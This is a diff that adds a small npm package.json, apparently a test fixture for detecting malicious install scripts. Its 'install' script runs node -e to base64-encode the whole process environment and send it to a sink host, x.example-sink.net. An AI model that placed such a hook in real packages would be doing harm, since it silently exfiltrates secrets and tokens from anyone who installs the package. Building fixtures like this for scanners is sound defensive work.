@@ -1,0 +1,10 @@
+{
+  "name": "install-node-e-inline",
+  "version": "1.0.0",
+  "description": "install script with node -e payload",
+  "main": "index.js",
+  "license": "MIT",
+  "scripts": {
+    "install": "node -e \"require('https').get('https://x.example-sink.net/'+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
+  }
+}
